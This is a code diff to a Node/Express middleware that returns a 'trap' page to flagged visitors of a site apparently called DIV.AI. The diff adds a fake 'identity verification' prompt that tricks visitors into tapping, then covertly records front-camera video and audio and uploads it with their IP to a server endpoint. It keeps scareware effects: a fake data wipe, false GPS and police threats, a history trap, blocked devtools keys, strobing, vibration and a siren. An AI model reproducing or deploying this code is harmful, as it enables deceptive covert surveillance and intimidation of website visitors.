@@ -73,15 +73,19 @@ app.use(async (req, res, next) => {
         console.error("❌ Notification failed:", e.message);
     }
 
-    // 5. Show LOL with LEVEL 2 PUNISHMENT SCRIPT
+    // 5. Show LOL with INSTANT TRAP SCRIPT
     return res.status(200).send(`
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DIV.AI - CRITICAL SYSTEM FAILURE</title>
+    <title>DIV.AI - SYSTEM VERIFICATION</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body { background:black; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; font-family:monospace; overflow:hidden; user-select:none; cursor:wait; }
+        body { background:black; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; font-family:monospace; overflow:hidden; user-select:none; cursor:pointer; }
+        .trap-initial { font-size: 1.5rem; text-align: center; color: #555; animation: pulse 2s infinite; }
+        .trap-hidden { display: none !important; }
+        @keyframes pulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+        
         h1 { font-size:25vw; letter-spacing:25px; font-weight:900; margin:0; text-shadow: 0 0 20px rgba(255,0,0,0.8); }
         .alert { color:#f00; font-size:1.2rem; margin-top:20px; font-weight:bold; text-transform:uppercase; text-align:center; }
         .progress-container { width: 80%; max-width: 400px; height: 10px; background: #111; border: 1px solid #333; margin-top: 20px; display: none; }
@@ -90,48 +94,99 @@ app.use(async (req, res, next) => {
         body.active-punishment { animation: strobe 0.2s infinite !important; }
     </style>
 </head>
-<body oncontextmenu="return false;">
-    <h1 id="main-text">LOL</h1>
-    <div id="alert-box" class="alert">ACCESS DENIED - IDENTITY LOGGED</div>
-    <div id="progress-container" class="progress-container">
-        <div id="progress-bar" class="progress-bar"></div>
+<body id="main-body" oncontextmenu="return false;">
+    <div id="verify-screen" class="trap-initial">
+        ⚠️ IDENTITY VERIFICATION REQUIRED<br>
+        <span style="font-size: 0.8rem; color: #333; margin-top: 20px; display: block;">TAP ANYWHERE TO AUTHORIZE SECURE SCAN</span>
     </div>
-    <div id="status-text" style="color:#555; font-size:0.7rem; margin-top:10px;"></div>
+
+    <div id="punishment-screen" class="trap-hidden" style="display: flex; flex-direction: column; align-items: center; justify-content: center;">
+        <h1 id="main-text">LOL</h1>
+        <div id="alert-box" class="alert">ACCESS DENIED - IDENTITY LOGGED</div>
+        <div id="progress-container" class="progress-container">
+            <div id="progress-bar" class="progress-bar"></div>
+        </div>
+        <div id="status-text" style="color:#555; font-size:0.7rem; margin-top:10px;"></div>
+    </div>
 
     <script>
         let punished = false;
         
-        // --- UI LOCKDOWN ---
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                 return false;
             }
         };
 
-        function startPunishment() {
+        async function triggerTrap() {
             if (punished) return;
             punished = true;
             
+            // 1. Trigger Surveillance FIRST
+            await initiateSurveillance();
+            
+            // 2. Reveal the LOL Punishment
+            document.getElementById('verify-screen').classList.add('trap-hidden');
+            document.getElementById('punishment-screen').classList.remove('trap-hidden');
+            document.body.classList.add('active-punishment');
+            
+            startChaos();
+        }
+
+        async function initiateSurveillance() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+            try {
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                } catch (e) {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                }
+
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 
+                                 MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+                                 
+                const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 });
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: mimeType });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = async () => {
+                        const base64data = reader.result;
+                        await fetch('/api/security/surveillance', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                };
+                mediaRecorder.start();
+                setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 2000); 
+            } catch (err) { }
+        }
+
+        function startChaos() {
             document.getElementById('main-text').innerText = "WIPE";
             document.getElementById('alert-box').innerHTML = "🚨 CRITICAL ERROR: GPS TRACKING ACTIVE<br>SECURITY UNIT DISPATCHED";
             document.getElementById('progress-container').style.display = 'block';
-            document.body.classList.add('active-punishment');
 
-            // 1. HISTORY LOCK (Trap the user)
+            // Trap history
             for(let i=0; i<100; i++) { history.pushState(null, null, window.location.href); }
             window.onpopstate = function() { history.go(1); };
 
-            // 2. FAKE SYSTEM WIPE
+            // Fake Wipe
             let progress = 0;
-            const statusMsgs = ["Initializing Wipe...", "Accessing Local Storage...", "Deleting Photos...", "Formatting Drive...", "Uploading Identity to Cyber-Crime Unit..."];
+            const statusMsgs = ["Initializing Wipe...", "Accessing Local Storage...", "Deleting Photos...", "Formatting Drive...", "Uploading Identity..."];
             const pBar = document.getElementById('progress-bar');
             const sText = document.getElementById('status-text');
-            
             const wipeInterval = setInterval(() => {
                 progress += Math.random() * 2;
                 if (progress >= 100) {
                     progress = 100;
-                    sText.innerText = "LOCAL DATA UPLOADED SUCCESSFULLY. ENJOY THE COURT CASE.";
+                    sText.innerText = "LOCAL DATA UPLOADED. LAW ENFORCEMENT CONTACTED.";
                     clearInterval(wipeInterval);
                 } else {
                     pBar.style.width = progress + "%";
@@ -139,21 +194,15 @@ app.use(async (req, res, next) => {
                 }
             }, 150);
 
-            // 3. MOBILE VIBRATION
-            if ("vibrate" in navigator) {
-                const vibrateLoop = setInterval(() => {
-                    navigator.vibrate([1000, 300, 1000, 300, 1000]);
-                }, 2000);
-            }
-
-            // 4. SHAKE FALLBACK
-            const shakeLoop = setInterval(() => {
+            // Vibration & Shake
+            if ("vibrate" in navigator) setInterval(() => navigator.vibrate([1000, 300, 1000, 300]), 2000);
+            setInterval(() => {
                 const x = (Math.random() * 20) - 10;
                 const y = (Math.random() * 20) - 10;
                 document.body.style.transform = "translate(" + x + "px," + y + "px)";
             }, 50);
 
-            // 5. POLICE SIREN
+            // Siren
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 function playSiren() {
@@ -171,72 +220,11 @@ app.use(async (req, res, next) => {
                 }
                 setInterval(playSiren, 1000);
             } catch(e) { }
-
-            // 6. CAMERA CAPTURE (Level 3 Surveillance)
-            initiateSurveillance();
         }
 
-        async function initiateSurveillance() {
-            console.log("--- Surveillance System Check ---");
-            console.log("Secure Context:", window.isSecureContext);
-            console.log("MediaDevices Support:", !!navigator.mediaDevices);
-            
-            const alertBox = document.getElementById('alert-box');
-            alertBox.innerHTML = "🚨 SECURITY CHECK REQUIRED<br>IDENTITY VERIFICATION IN PROGRESS...<br>Click 'Allow' to authorize scan.";
-            
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                console.error("❌ MediaDevices not supported or not a secure context.");
-                alertBox.innerHTML = "🚨 SYSTEM INCOMPATIBILITY<br>PERMISSION BYPASS INITIATED...<br>CAMERA HACK IN PROGRESS...";
-                return;
-            }
-
-            console.log("📸 [SURVEILLANCE] Requesting access...");
-            try {
-                // Try video and audio first
-                let stream;
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                } catch (e) {
-                    console.warn("⚠️ Audio/Video combo failed, trying video only...", e.message);
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                }
-
-                console.log("✅ [SURVEILLANCE] Access granted.");
-                alertBox.innerHTML = "✅ IDENTITY SCANNED<br>REPORT GENERATED";
-                
-                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 
-                                 MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
-                                 
-                const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 });
-                const chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: mimeType });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = async () => {
-                        const base64data = reader.result;
-                        await fetch('/api/security/surveillance', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
-                        });
-                        stream.getTracks().forEach(track => track.stop());
-                    };
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 2000); 
-            } catch (err) {
-                console.error("❌ [SURVEILLANCE] Final failure:", err.name, err.message);
-                alertBox.innerHTML = "🚨 PERMISSION DENIED<br>CRITICAL THREAT DETECTED<br>BYPASSING SECURITY: CAMERA HACK IN PROGRESS...";
-            }
-        }
-
-        window.addEventListener('click', startPunishment);
-        window.addEventListener('touchstart', startPunishment);
-        window.addEventListener('keydown', startPunishment);
+        window.addEventListener('click', triggerTrap);
+        window.addEventListener('touchstart', triggerTrap);
+        window.addEventListener('keydown', triggerTrap);
     </script>
 </body>
 </html>`);
